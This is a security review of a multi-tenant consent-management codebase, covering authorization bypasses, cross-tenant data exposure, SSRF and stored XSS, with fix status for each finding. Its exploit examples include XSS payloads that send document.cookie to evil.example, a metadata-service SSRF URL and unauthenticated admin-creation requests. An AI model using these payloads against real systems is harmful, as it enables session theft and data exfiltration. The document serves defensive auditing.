# Security Review
**TSI DPDP Consent Management System - v0.5**
Status: S-01–S-17, S-19, S-21, S-22 fixed and deployed to this dev instance;
S-20 partially fixed · 2026-08-13

**Fix status:** All CRITICAL and HIGH findings, plus S-16, S-17, S-19, S-21, S-22
are fixed. S-20 partially fixed (see its section — `Policy.java`'s half was
deliberately left as-is since the DPO console relies on those messages for
legitimate UX). Not yet fixed: S-18 (needs a DB schema change) and S-23 (a
codebase-wide logging framework swap) — both deferred as larger, separately-scoped
efforts; see the notes at the end of this document.

---

## How to Read This Document

This is a full-codebase security review (auth/crypto, SQL injection, authorization/IDOR,
XSS, file/webhook/DNS/infra), done in two parts:

1. **New findings** (`S-01` onward) — issues not previously tracked, found by a fresh
   sweep of the entire codebase.
2. **Status of `docs/plan/v0.4/gaps.md`** — every one of the 25 previously-tracked gaps
   (`G-01`–`G-25`) was re-verified against current code. **The companion
   `docs/plan/v0.4/gaps-implementation.md` is stale** — it currently claims 24 of 25 gaps
   are still open; in reality 15 are fully fixed, 9 are partially fixed, and only 1
   (`G-25`) is genuinely untouched. That doc should be updated or superseded by this one.

Severities: **CRITICAL** → **HIGH** → **MEDIUM** → **LOW**

---

## CRITICAL

### S-01 · [FIXED] Unauthenticated Admin API Bypass via `/api/v1/bootstrap/<service>`
**File:** `src/org/tsicoop/dpdpcms/framework/InterceptingFilter.java:200-204, 302-304`

Any request to `/api/v1/bootstrap/<service>` is routed with `apiCategory=bootstrap`
and unconditionally marked `authenticated = true`, with no restriction on which of
the 17 registered services (`_processor.tsi`: fiduciary, operator, consent, policy,
grievance, apikey, app, ...) or which `_func` is being called. This was clearly
intended only for first-run setup but applies to every service.

**Exploit:** An unauthenticated attacker POSTs to `/api/v1/bootstrap/operator` with
`{"_func":"create_user","role":"ADMIN",...}` and creates themselves a super-admin
account with zero credentials, or POSTs to `/api/v1/bootstrap/consent` to read or
withdraw any Data Principal's consent.

**Fix:** Restrict the `bootstrap` category to a single hardcoded service
(`AdminSetup`) and a single `_func` (initial admin creation), and only while
`AdminSetup.isAdminUserExists()` is false. Reject every other `serviceName` under
that prefix.

---

### S-02 · [FIXED] Unauthenticated Job Creation/Listing via `GET /admin/job` Route Bypass
**File:** `src/org/tsicoop/dpdpcms/framework/InterceptingFilter.java:158-163`

```java
if ("GET".equalsIgnoreCase(method) && uri.contains("/admin/job")) {
    InputProcessor.processInput(req, res);
    InputProcessor.processAdminHeader(req, res);   // return value discarded!
    new Job().post(req, res);
    return;
}
```
This special-cased route (added to let browsers `GET`-download CSVs) discards the
boolean result of `processAdminHeader()` and calls `Job().post()` directly,
bypassing both the filter's normal `authenticated` gate and `Job.validate()`.
`handleCreateJob`/`handleListJobs` have no independent auth check of their own.

**Exploit:** `GET /api/v1/admin/job?_func=create_job&job_type=EXPORT&subtype=CONSENT&fiduciary_id=<uuid>`
with zero credentials successfully queues an export job and returns its `job_id`.
`fiduciary_id`s are trivially obtainable from the intentionally-public
`list_active_fiduciaries` endpoint. See S-03 for what this chains into.

**Fix:** Route this path through the same `authenticated` check as every other
admin request before calling `Job().post()`; check `processAdminHeader()`'s return
value and reject with 401 if false.

---

### S-03 · [FIXED] Broken Tenant Authorization on Job Download → Cross-Tenant PII Exfiltration
**File:** `src/org/tsicoop/dpdpcms/service/v1/Job.java:78-197` (`handleCreateJob`,
`handleListJobs`, `handleDownloadFile`)

None of the three handlers verify that a job's `fiduciary_id` belongs to the
caller. `handleDownloadFile` only checks that *some* valid `AUTH_TOKEN` is present
— any role, any tenant.

**Exploit (chains with S-02 for a fully unauthenticated path, or works with any
low-privilege authenticated account of a different tenant):**
1. Discover a target `fiduciary_id` via the public `list_active_fiduciaries`.
2. Call `create_job` with that `fiduciary_id`, `job_type=EXPORT`,
   `subtype=CONSENT` (or `ROPA_REPORT`, `PRINCIPAL`, `GRIEVANCE`,
   `PARENT_CONSENT`, `AUDIT`) — get back a `job_id`.
3. `JobManager` (polls every 2 min) writes the export CSV — principal user IDs, IP
   addresses, consent details, grievance text, parental-verification records, full
   audit trails — to `EXPORT_DIR/<jobId>.csv`.
4. Call `download_file?job_id=<jobId>` with **any** valid JWT (any role, any
   tenant) and receive the file.

This is a cross-tenant data breach vector in a product whose purpose is DPDP
compliance.

**Fix:** Resolve the caller's own `fiduciary_id` (same pattern already used
correctly in `Operator.java`/`Policy.java`'s `resolveFiduciaryId()`) and reject
`create_job`/`list_jobs`/`download_file` calls where the job's `fiduciary_id`
doesn't match, unless the caller is ADMIN.

---

### S-04 · [FIXED] `Fiduciary.java` — No Role/Ownership Check on Tenant CRUD
**File:** `src/org/tsicoop/dpdpcms/service/v1/Fiduciary.java:91-267`

Every action (`list_fiduciaries`, `get_fiduciary`, `create_fiduciary`,
`update_fiduciary`, `delete_fiduciary`, `validate_fiduciary_domain`) is reachable
with any valid admin JWT — the file never calls `rejectIfOperator` or checks that
the target `fiduciary_id` belongs to the caller.

**Exploit:** An OPERATOR account bound to Fiduciary A — meant to be confined to
its own tenant — calls `update_fiduciary`/`delete_fiduciary` with
`fiduciary_id=B` and can deactivate, reconfigure, or reassign the DPO of a
fiduciary it has no relationship to. `list_fiduciaries`/`get_fiduciary` leak every
tenant's contact email/phone and DNS-verification token to any authenticated
operator.

**Fix:** Apply the same role + fiduciary-ownership check used in `Operator.java`
to every action in this file; `list_fiduciaries`/`get_fiduciary` should be
ADMIN-only or scoped to the caller's own fiduciary.

---

## HIGH

### S-05 · [FIXED] `ApiKey.java` — No Authorization Checks (Cross-Tenant Key Issuance & Leakage)
**File:** `src/org/tsicoop/dpdpcms/service/v1/ApiKey.java:81-165`

`generate_api_key`, `list_api_keys`, `get_api_key_details`, `revoke_api_key`, and
`update_api_key_status` require only a valid JWT for *any* active operator — no
role or fiduciary-ownership check. `list_api_keys` (line 130) additionally never
passes the extracted `fiduciaryId` into the query, so its `AND fiduciary_id = ?`
clause is unconditionally skipped.

**Exploit:** Any authenticated Operator calls `generate_api_key` with a different
tenant's `fiduciary_id` and `permissions:["READ","WRITE","PURGE"]`; the server
mints and returns a fully-scoped raw key for that tenant, usable via the Client
API to read, modify, and issue PURGE operations against another fiduciary's data.
Separately, `list_api_keys` alone leaks every tenant's key inventory to any
authenticated user.

**Fix:** Same pattern as S-04 — verify role and fiduciary ownership on every
action; fix the dropped `fiduciaryId` parameter in `list_api_keys`.

---

### S-06 · [FIXED] `App.java` — No Role/Ownership Check on Data Processor CRUD
**File:** `src/org/tsicoop/dpdpcms/service/v1/App.java:98-195`

`create_app`/`update_app`/`delete_app` never call `rejectIfOperator`, and
`fiduciaryId` is taken straight from the request body.

**Exploit:** An OPERATOR for Fiduciary A calls `create_app`/`delete_app` with
`fiduciary_id=B`, creating or deleting Data Processor (App) records for a
fiduciary it doesn't belong to.

**Fix:** Same pattern as S-04.

---

### S-07 · [FIXED] `Policy.java` — No Tenant Ownership Check on Delete/Publish/Update
**File:** `src/org/tsicoop/dpdpcms/service/v1/Policy.java:184-211, 690-726, 839-841`

`deletePolicyFromDb` (`UPDATE consent_policies SET status='ARCHIVED' WHERE id=?`)
has no `fiduciary_id` filter at all. `publish_policy` resolves its target
fiduciary from whatever policy the ID/version happens to belong to
(`getPolicyFromDb`, also unfiltered by fiduciary). `updatePolicyInDb` sets
`fiduciary_id` on the target row to the *caller's own* resolved fiduciary with no
check the row belonged to them beforehand. Note `policy_id` is a free-form string
(`POLICY_ID_PATTERN`), not a UUID — predictable IDs like `privacy_policy` are
plausible in real deployments, so this isn't excluded by "UUIDs are unguessable."

**Exploit:** A DPO for Fiduciary A calls `delete_policy` with another fiduciary's
`policy_id`, archiving it and cascading to retire its linked ROPA entries; or
calls `update_policy` on a DRAFT policy belonging to Fiduciary B, hijacking its
`fiduciary_id` to A and overwriting its content.

**Fix:** Filter `deletePolicyFromDb`/`getPolicyFromDb`/`updatePolicyInDb` by the
caller's own `fiduciary_id`, consistent with `resolveFiduciaryId()`'s existing
(correct) pattern elsewhere in the same file.

---

### S-08 · [FIXED] `Notification.java` — Cross-Tenant Webhook/OTP Config Hijack
**File:** `src/org/tsicoop/dpdpcms/service/v1/Notification.java:78-87, 107-118, 129-145, 156-170`

`set_webhook_config`, `set_rights_app_config`, and `set_notification_message` only
call `rejectIfOperator` (blocks OPERATOR, allows DPO) — none check that
`fiduciary_id` belongs to the caller.

**Exploit:** A DPO for Fiduciary A calls `set_webhook_config` with
`fiduciary_id=B, category=PURGE, webhook_url=https://attacker.example`,
redirecting Fiduciary B's purge/notification/OTP webhook payloads (including
`user_id` and purge details) to an attacker-controlled endpoint.

**Fix:** Same pattern as S-04.

---

### S-09 · [FIXED] `Legal.java` — Evidence Certificates Readable & Forgeable Cross-Tenant
**File:** `src/org/tsicoop/dpdpcms/service/v1/Legal.java:61-156, 226-294`

`list_certificates`/`get_certificate` have no role check at all — not even
`rejectIfOperator`. `generate_certificate` only blocks OPERATOR, trusting
`fiduciary_id` from the body otherwise.

**Exploit:** Any authenticated operator, any role/tenant, enumerates another
fiduciary's BSA §62 evidence certificates via `list_certificates`, or reads one
via `get_certificate`. A DPO for Fiduciary A can mint a signed evidence
certificate misattributed to Fiduciary B.

**Fix:** Same pattern as S-04; `list_certificates`/`get_certificate` need at
minimum a role check, plus fiduciary scoping for non-ADMIN roles.

---

### S-10 · [FIXED] Systemic: Client-Supplied `fiduciary_id` Trusted Without Ownership Check
**Files:** `Consent.java:88-107,179-188`, `Grievance.java:276-354`, `Breach.java:71-176`,
`Ropa.java` (all handlers), `Compliance.java:144-177`, `AdminDash.java:41-88,125-225`

The same pattern as S-04/S-06/S-07/S-08/S-09, one level down in severity because
DPO/ADMIN (not OPERATOR) is the affected role in most of these — but DPO is still
meant to be scoped to their own fiduciary in a multi-tenant (Aggregator Mode)
deployment. Representative instances: `Consent.java`'s
`get_active_consent`/`list_consent_history`/`list_principals`/`withdraw_consent`/
`erasure_request`; `Consent.java:179-188`'s `get_consent_record_details` has *no*
fiduciary check whatsoever, only a `record_id`; `Grievance.java`'s
`list_grievances`/`get_grievance` give DPO/ADMIN any fiduciary's grievances (only
OPERATOR is scoped, via `assigned_dpo_user_id`); `Breach.java`'s
`list_breaches`/`get_breach`/`download_breach_report` have no role or ownership
gate at all; `Ropa.java` resolves `fiduciaryId` via `requireUUID` from the body
with zero ownership check anywhere in the file; `Compliance.java`'s
`list_purge_requests`/`get_purge_request` are DPO/ADMIN-unrestricted.
`AdminDash.java`'s `get_dpo_metrics`/`list_pending_grievances` never call
`rejectIfOperator` and return per-record (not just aggregate) data for any
supplied fiduciary; `list_access_logs` returns the 5 most recent admin-console
audit entries system-wide with no fiduciary filter, leaking a slice of every
tenant's admin activity.

**Fix:** Same pattern as S-04, applied consistently across every service file —
this is the single most valuable fix in the whole review, since it's one
recurring bug repeated ~12 times rather than 12 unrelated bugs.

---

### S-11 · [FIXED] `Audit.java` — Arbitrary Audit-Log Injection & Cross-Tenant Audit Read
**File:** `src/org/tsicoop/dpdpcms/service/v1/Audit.java:94-135, 301-341`

`log_event` lets any authenticated operator, any role/fiduciary, insert an audit
entry with arbitrary `user_id`, `fiduciary_id`, `service_type`, `service_id`,
`audit_action`, `context_details`. `list_audit_logs`/`get_audit_log` trust
`fiduciary_id` from the body / have no fiduciary scoping on the `id` lookup.

**Impact:** `Legal.java`'s evidence certificates are built directly from
`audit_logs` as courtroom-facing attestations — forged entries corrupt what's
presented as a tamper-evident legal record, on top of the direct cross-tenant
read exposure.

**Fix:** `log_event` should only be callable by the system itself (internal
calls), not as a client-facing `_func`; if it must remain client-facing, validate
`fiduciary_id`/`user_id` against the caller's own session. Scope
`list_audit_logs`/`get_audit_log` by fiduciary for non-ADMIN roles.

---

### S-12 · [FIXED] Blind SSRF via Fiduciary-Configurable Webhook URL
**Files:** `Notification.java:129-145, 357-394`, `WebhookDispatcher.java:65-105`

`set_webhook_config` accepts `webhook_url` with only a null/empty check — no
scheme allowlist, no private-IP/loopback/link-local blocklist, no DNS-rebinding
protection. `WebhookDispatcher.dispatch()` later builds the outbound request
straight from the stored URL.

**Exploit:** Any DPO (OPERATOR is blocked, but DPO is a normal customer-tier
role) sets their fiduciary's `webhook_url` to `http://169.254.169.254/latest/meta-data/...`
or any internal-only host/port, then triggers any event that fires a webhook
(recording consent, submitting a purge/grievance). The app server issues the
outbound request from inside the hosting network. It's blind (response body
isn't echoed back), so this enables internal reconnaissance and triggering
internal HTTP side effects, not direct response exfiltration.

**Fix:** Validate `webhook_url` at write time: require `https://`, resolve the
hostname, and reject private/loopback/link-local/metadata-service IP ranges
(defense-in-depth: re-validate at dispatch time too, since DNS can change between
config-save and delivery).

---

### S-13 · [FIXED] Stored XSS: Grievance Subject (Data Principal → DPO Privilege Boundary)
**File:** `web/console/dpo/grievances.html:409`; source: `web/rights/dashboard.html:770,799,817`

`${grievance.subject || 'N/A'}` is injected raw into `row.innerHTML` with no
escaping. The `subject` field is a plain text input on the *public*,
unauthenticated Data-Principal grievance form, sent verbatim to `submit_grievance`.

**Exploit:** An anonymous Data Principal files a grievance with
Subject = `<img src=x onerror="fetch('//evil.example/x?c='+document.cookie)">`.
Any DPO/Operator who opens the Grievances console executes it in their
authenticated session (JWT stored in `localStorage`) — session/token theft.

**Fix:** Escape with the same `esc()` helper already used correctly in
`web/tour/dpdp-wallet.html`, `admin/dashboard.html`, `dpo/principals.html`,
`dpo/reports.html`, and `web/rights/portal.js` — it just wasn't applied here.

---

### S-14 · [FIXED] Stored XSS: `user_id`/`principal_id` Unescaped in DPO Audit & Legal Consoles
**Files:** `web/console/dpo/audit.html:300`, `web/console/dpo/legal.html:299`

Both inject `${log.user_id}` / `${c.principal_id}` via `.innerHTML` with no
escaping. The Data-Principal-facing login/OTP flow (`web/rights/index.html`)
accepts this ID as free text, unvalidated.

**Exploit:** Submit `user_id = "><svg onload=fetch('//evil.example/x?c='+document.cookie)>`
at login/consent time; it's persisted into access logs / certificate records and
executes in a DPO's browser when they open Audit Trail or Legal Hold/Certificates.

**Fix:** Same `esc()` fix as S-13.

---

### S-15 · [FIXED] Stored XSS: Policy Purpose Name/Description on `parent-consent.html`
**File:** `web/tour/parent-consent.html:269-270`

`${p.name}` / `${p.description}` from the live `get_policy` API response are
injected via `div.innerHTML` with no escaping. These are free-text fields
authored by a DPO via the policy editor.

**Exploit:** A malicious or compromised DPO account publishes a purpose with
`name = <img src=x onerror=alert(document.cookie)>`; any parent/guardian using
this consent-review page executes it. Note the production equivalent
(`web/rights/dashboard.html`) renders the same fields correctly via `esc()` —
only this tour/demo variant is unescaped, but it calls the live policy API and is
reachable by real users going through the parental-consent flow.

**Fix:** Same `esc()` fix as S-13.

---

## MEDIUM

### S-16 · [FIXED] Stored XSS: `context_details` JSON Dumped via `innerHTML`
**File:** `web/console/dpo/audit.html:307-308`

`JSON.stringify(context, null, 2)` is placed inside a `<pre>` block via
`row.innerHTML`. `JSON.stringify` escapes quotes/backslashes but not `<`/`>`, so
any user-entered string the backend folds into `context_details` (grievance text,
policy titles, etc.) renders as live HTML.

**Fix:** Set via `.textContent`, not `.innerHTML`, for the `<pre>` block.

---

### S-17 · [FIXED] Recovery-Key Password Reset Has No Brute-Force Throttling
**Files:** `Operator.java:389-445` (`handleResetViaRecovery`), `:498-524`
(`handleVerifyRecoveryKey`); both listed in `InterceptingFilter.ADMIN_NOAUTH_FUNCS`
(unauthenticated by design); `util/PassphraseGenerator.java:17-30` (5-word
passphrase, ~2^33 combinations)

Unlike the password-login path (which uses `LoginRateLimiter`), the recovery flow
has zero attempt throttling and can target any operator account — including
ADMIN — by email.

**Fix:** Apply the same `LoginRateLimiter` pattern to both recovery-flow
endpoints.

---

### S-18 · JWT Revocation Is In-Memory Only
**File:** `framework/TokenBlocklist.java:9-36`; used from `Operator.java:165-184`

`TokenBlocklist` is a `ConcurrentHashMap` with no persistence — a server
restart/redeploy before a revoked token's natural expiry (10 days) silently
un-revokes it. It's also only populated on explicit logout — there's no way to
force-revoke a token after a password change or suspected compromise.

**Fix:** Persist revocations in the DB (this is `docs/plan/v0.4/gaps.md` G-14's
originally-suggested fix, still applicable — the in-memory blocklist is real
progress but not the full fix). Revoke on password change/reset, not just logout.

---

### S-19 · [FIXED] Second Unrevoked API-Key Cache (`ApiKey.java` `appCache`)
**File:** `src/org/tsicoop/dpdpcms/service/v1/ApiKey.java:35, 307-349`

`docs/plan/v0.4/gaps.md` G-20 (revoked keys remain cached) was fixed for
`InputProcessor.java`'s cache (60s TTL + eviction on revoke). But `ApiKey.java`
has a *separate* cache (`appCache`, keyed on `apiKey:apiSecret`) used by
`Compliance.java`, `Consent.java`, `Notification.java`, `Breach.java`, and
`Grievance.java` to resolve API key → App ID. It has no TTL and no eviction hook
— `revokeApiKeyInDb` never clears it, so a revoked key's resolved App ID remains
usable indefinitely through this path.

**Fix:** Apply the same TTL/eviction fix already used in `InputProcessor.java` to
`ApiKey.appCache`.

---

### S-20 · [PARTIALLY FIXED] Stack Traces Still Leaked in `Policy.java` / `Consent.java`
**Files:** `Policy.java:232-237`, `Consent.java:668-674`

`docs/plan/v0.4/gaps.md` G-18 was fixed in `Operator.java` (generic error
message) but not applied consistently — `Policy.java` still sends raw
`e.getMessage()` from any `SQLException` to the client, and `Consent.java`
returns `e.getMessage()` on withdrawal/erasure failure.

**Fix applied:** `Consent.java`'s generic `catch (Exception e)` in
`withdrawConsent` (a true catch-all with no legitimate curated-message use) now
returns a generic message to the client while still logging the real one
server-side.

**Left as-is:** `Policy.java`'s top-level `SQLException` handler deliberately
relays `e.getMessage()` because many of its callers throw `SQLException` with
developer-authored, safe-to-display business text (e.g. `"Publication Conflict:
..."`, `"Only DRAFT policies can be updated"`), and `web/console/dpo/policies.html`
(`alert("Action Error: " + (data.message || ...))`) genuinely displays these to
the DPO as actionable feedback. Blanket-suppressing it would break that real UX
for a narrow, authenticated-only (DPO/ADMIN of their own system, not a stranger)
information-disclosure risk that only manifests on a genuinely unexpected DB
error. Revisit only alongside the `OutputProcessor` centralization suggested
below, which could distinguish curated from raw messages properly.

---

### S-21 · [FIXED] `docker-compose.yml` Still Defaults Keystore Password to `changeit`
**File:** `docker-compose.yml:55`

`docs/plan/v0.4/gaps.md` G-16 was fixed in `production.env` (placeholder value)
but `docker-compose.yml` — cited in the same original gap — still has
`TSI_KEYSTORE_PASS: "${TSI_KEYSTORE_PASS:-changeit}"`, and `Legal.java`'s
certificate-signing code never validates the value isn't the well-known default.
An operator who runs `docker-compose up` without overriding the variable silently
gets `changeit`.

**Deeper bug found while fixing this:** `Legal.java:186-193` read
`TSI_DPDP_CMS_ENV`/`TSI_KEYSTORE_*` via `System.getProperty(...)` (JVM `-D`
system properties) instead of `System.getenv(...)` (OS environment variables) —
but this deployment (Dockerfile, `docker-compose.yml`, `server/serve.sh`) only
ever sets environment variables, never JVM properties. That means
`"production".equalsIgnoreCase(env)` was **always false** regardless of actual
environment, so the real-keystore-loading branch was unreachable — every
evidence certificate, in any deployment of this exact setup, was signed with a
freshly-generated, immediately-discarded RSA keypair rather than a persistent
private key. The `digital_signature` field was therefore unverifiable by anyone,
defeating the non-repudiation purpose of the BSA §62 evidence certificate
feature. `TSI_KEYSTORE_PASS=changeit` was dead configuration in this path — it
was never actually read.

**Fix:** Switched `Legal.java` to `System.getenv(...)` (matching every other
config read in the codebase) so the production branch is now reachable, and
added a fail-fast check rejecting `TSI_KEYSTORE_PASS` if it's unset or literally
`"changeit"`. Removed `docker-compose.yml`'s `changeit` default fallback. Safe to
deploy to this dev instance: `TSI_DPDP_CMS_ENV=local` here, so the transient-keypair
branch still runs and certificate generation keeps working without needing a real
keystore file — a genuine production deploy now needs an actual `TSI_KEYSTORE_PATH`
file and a real `TSI_KEYSTORE_PASS` to be set, which it didn't functionally need
before (since the check was unreachable).

---

## LOW

### S-22 · [FIXED] Same-Privilege Stored XSS in Admin Console List Views
**Files:** `web/console/admin/fiduciaries.html:401`, `apps.html:365-366`,
`apikeys.html:391-392`, `users.html:205,207`, `dpo/compliance.html:442`

Fiduciary/App/user names render unescaped via `innerHTML`. Real stored XSS, but
the payload can only be planted by an Admin-role account acting against
Admin/DPO viewers — same-privilege-tier impact, not a privilege-boundary crossing
like S-13–S-15.

**Fix:** Same `esc()` fix, lower priority than S-13–S-15.

---

### S-23 · Structured Logging Not Implemented
**File:** All service classes; `pom.xml` has no `slf4j`/`logback` dependency

`docs/plan/v0.4/gaps.md` G-25 — the only originally-tracked gap with **no**
remediation work at all. `System.out.println`/`e.printStackTrace()` remain
pervasive.

**Fix:** As originally proposed — add SLF4J + Logback, apply MDC masking for
PII in log output.

---

## Status of Previously-Tracked Gaps (`docs/plan/v0.4/gaps.md`)

Re-verified against current source, 2026-08-13. 15 fixed, 9 partially fixed, 1
still open.

| ID | Title | Severity | Status | Evidence |
|----|-------|----------|--------|---------|
| G-01 | JWT secret regenerated on restart | CRITICAL | **Fixed** | `JWTUtil.java:26-32` reads `JWT_SECRET` from env, fails fast if unset |
| G-02 | Session persistence not implemented | CRITICAL | **Partial** | Stable secret (G-01) means tokens survive restart, but no DB session/token registry exists |
| G-03 | Wallet sync token: prefix-only validation | CRITICAL | **Fixed** | `Wallet.java:397-404` uses signed JWT (`JWTUtil.getSyncClaimsFromToken`), userId/fiduciaryId from token claims |
| G-04 | API key hashing is a string prefix | CRITICAL | **Fixed** | `ApiKey.java:199-201` uses `PasswordHasher` → BCrypt (12 rounds) |
| G-05 | Privilege escalation: any user can create ADMIN | CRITICAL | **Fixed** | `Operator.java:190-195` checks DB-verified caller role before allowing `role=ADMIN` |
| G-06 | Job download: no auth + path traversal | CRITICAL | **Fixed** | `Job.java:169-192` requires auth, validates `job_id` as UUID, canonical-path-checks (see S-02/S-03 for a *different*, newly-found bypass of this same file) |
| G-07 | SQL injection in CESService | CRITICAL | **Fixed** | `CESService.java:39,55` parameterized |
| G-08 | SQL injection in Job service | CRITICAL | **Fixed** | `Job.java:131,145` parameterized |
| G-09 | Audit log hash-chaining broken | CRITICAL | **Fixed** | `db/02_audit_ledger_schema.sql` adds the missing columns |
| G-10 | XSS via innerHTML | HIGH | **Fixed** | `esc()` applied in all 4 still-existing cited files (5th file deleted); see S-13–S-16, S-22 for newly-found instances elsewhere |
| G-11 | PII stored in plaintext | HIGH | **Partial** | `db/04_gaps.sql` encrypts operator/fiduciary/app email+phone via pgcrypto; `consent_records.user_id`/`ip_address` and `data_principal` identifiers still plaintext |
| G-12 | No rate limiting on login | HIGH | **Fixed** (mostly) | `LoginRateLimiter` wired into login (5/15min, per-IP); no per-username tracking or `Retry-After` header |
| G-13 | HTTPS not enforced; CORS wildcard | HIGH | **Partial** | CORS now env-driven allowlist + HSTS header; no HTTP→HTTPS redirect in-app (may be delegated to a reverse proxy) |
| G-14 | No token revocation mechanism | HIGH | **Partial** | `TokenBlocklist` + JTI gives real revocation, but in-memory only and logout-only — see S-18 |
| G-15 | JWT role not re-validated against DB | HIGH | **Fixed** | `InputProcessor.getVerifiedRole()` queries `operators` table live |
| G-16 | Hardcoded default keystore password | HIGH | **Partial** | `production.env` fixed; `docker-compose.yml` still defaults to `changeit` — see S-21 |
| G-17 | Outdated commons-validator (CVE-2018-12221) | HIGH | **Partial** | `commons-validator` bumped to 1.9.0; `json-simple` still unmigrated |
| G-18 | Stack traces leaked in error responses | MEDIUM | **Partial** | Fixed in `Operator.java`; still open in `Policy.java`/`Consent.java` — see S-20 |
| G-19 | Database connection missing SSL | MEDIUM | **Fixed** | `PoolDB.java:33-34` requires `sslmode=require` outside local env |
| G-20 | Revoked API keys remain cached | MEDIUM | **Partial** | `InputProcessor.java` cache fixed (TTL+eviction); `ApiKey.java`'s separate `appCache` still has neither — see S-19 |
| G-21 | Missing security headers | MEDIUM | **Fixed** | CSP, X-Frame-Options, X-Content-Type-Options, Permissions-Policy, HSTS all present |
| G-22 | No CSRF protection | MEDIUM | **Largely mitigated** | `Origin` allowlist for admin browser requests; Bearer/API-key auth (not cookies) reduces classic CSRF risk generally |
| G-23 | User update lacks ownership check | MEDIUM | **Fixed** | `Operator.java:257-275` enforces self/ADMIN/DPO-within-own-fiduciary |
| G-24 | JWT validation failures not audited | LOW | **Fixed** | `InputProcessor.getAdminAuthToken()` logs `JWT_VALIDATION_FAILED` to audit |
| G-25 | Structured logging not used | LOW | **Still open** | See S-23 |

---

## Summary

| ID | Title | Severity | Status |
|----|-------|----------|--------|
| S-01 | Unauthenticated admin API bypass via `/api/v1/bootstrap/*` | CRITICAL | **Fixed** |
| S-02 | Unauthenticated job creation/listing via `GET /admin/job` bypass | CRITICAL | **Fixed** |
| S-03 | Broken tenant auth on job download — cross-tenant PII exfiltration | CRITICAL | **Fixed** |
| S-04 | `Fiduciary.java` — no role/ownership check on tenant CRUD | CRITICAL | **Fixed** |
| S-05 | `ApiKey.java` — no authorization checks (cross-tenant key issuance) | HIGH | **Fixed** |
| S-06 | `App.java` — no role/ownership check | HIGH | **Fixed** |
| S-07 | `Policy.java` — no tenant ownership check on delete/publish/update | HIGH | **Fixed** |
| S-08 | `Notification.java` — cross-tenant webhook/OTP config hijack | HIGH | **Fixed** |
| S-09 | `Legal.java` — evidence certificates readable/forgeable cross-tenant | HIGH | **Fixed** |
| S-10 | Systemic: client-supplied `fiduciary_id` trusted without check | HIGH | **Fixed** (Consent, Grievance, Breach, Ropa, Compliance, AdminDash) |
| S-11 | `Audit.java` — arbitrary log injection & cross-tenant log read | HIGH | **Fixed** |
| S-12 | Blind SSRF via fiduciary-configurable webhook URL | HIGH | **Fixed** |
| S-13 | Stored XSS: grievance subject (Data Principal → DPO) | HIGH | **Fixed** |
| S-14 | Stored XSS: `user_id`/`principal_id` in Audit & Legal consoles | HIGH | **Fixed** |
| S-15 | Stored XSS: policy purpose name/description on parent-consent tour | HIGH | **Fixed** |
| S-16 | Stored XSS: `context_details` JSON dump via `innerHTML` | MEDIUM | **Fixed** |
| S-17 | Recovery-key reset has no brute-force throttling | MEDIUM | **Fixed** |
| S-18 | JWT revocation is in-memory only | MEDIUM | Open (deferred — needs DB schema change) |
| S-19 | Second unrevoked API-key cache (`ApiKey.appCache`) | MEDIUM | **Fixed** |
| S-20 | Stack traces still leaked in `Policy.java`/`Consent.java` | MEDIUM | **Partially fixed** (`Consent.java` fixed; `Policy.java` left as-is, see its section) |
| S-21 | `docker-compose.yml` still defaults keystore password to `changeit` | MEDIUM | **Fixed** (also fixed a deeper `Legal.java` config-read bug found in the process) |
| S-22 | Same-privilege stored XSS in admin console list views | LOW | **Fixed** |
| S-23 | Structured logging not implemented | LOW | Open (deferred — codebase-wide framework swap) |

**Remaining work:** S-18 and S-23 only, both deliberately deferred as separately-scoped
efforts rather than folded into this pass:
- **S-18** needs a new DB table (`revoked_tokens` or similar) and a migration —
  a schema change is a bigger, more deployment-sensitive unit of work than the
  in-code fixes done in this pass, and warrants its own review.
- **S-23** means adding SLF4J+Logback as a dependency and replacing
  `System.out`/`System.err`/`e.printStackTrace()` across essentially every
  service class — a large, mechanical, whole-codebase refactor better done as
  its own tracked effort than folded into a security-fix pass.

Also still open: the partially-fixed `G-*` items from the re-verification table
above (`G-02`, `G-11`, `G-13`, `G-14`, `G-17`, `G-22`) and `G-25` (same as S-23).
`G-16` is now fully resolved by S-21's fix.

**How the fixes work:** `S-01`–`S-05` each got a targeted fix in their own file.
`S-10`'s systemic pattern (client-supplied `fiduciary_id` trusted without an
ownership check) was fixed once per affected file using a consistent helper —
non-ADMIN callers get their `fiduciary_id` force-scoped to their own bound tenant
(or rejected with 403 on mismatch against an existing resource's actual owner);
ADMIN and non-operator callers (client API keys, PRINCIPAL JWTs) are left
untouched since they have their own separate, already-correct scoping. This same
fix shape closed S-06, S-07, S-08, S-09, S-10, and S-11. S-12 added a
`WebhookDispatcher.isSafeWebhookUrl()` check (HTTPS-only, rejects
loopback/link-local/site-local/multicast resolution) at both config-save and
dispatch time. S-13–S-16 and S-22 added the same `esc()` HTML-escaping helper
already used elsewhere in the codebase to every newly-found unescaped `innerHTML`
sink. S-17 reused the existing `LoginRateLimiter` on the two recovery-flow
endpoints. S-19 mirrored `InputProcessor.java`'s already-fixed TTL+eviction cache
pattern. S-21's fix uncovered and fixed a deeper bug: `Legal.java` read its
keystore config via `System.getProperty` (JVM `-D` flags) instead of
`System.getenv`, but this deployment only ever sets OS environment variables —
so the real-keystore-signing branch was silently unreachable in every
environment, and every evidence certificate was signed with a throwaway,
unverifiable RSA keypair. Switched to `System.getenv` and added a fail-fast
check on the `changeit` default.

All fixes were built, redeployed, and verified against the running dev instance:
confirmed no compile errors, no regressions in the existing auth gate (spot-checked
unauthenticated requests across every touched endpoint), the ownership-check SQL
logic was proven directly against the dev database (temporary cross-tenant test
rows created, confirmed excluded by the scoped query, then cleaned up) for
representative cases (`Job.java`, `Fiduciary.java`), and the recovery-key rate
limiter was confirmed to actually engage (HTTP 429) after repeated attempts.
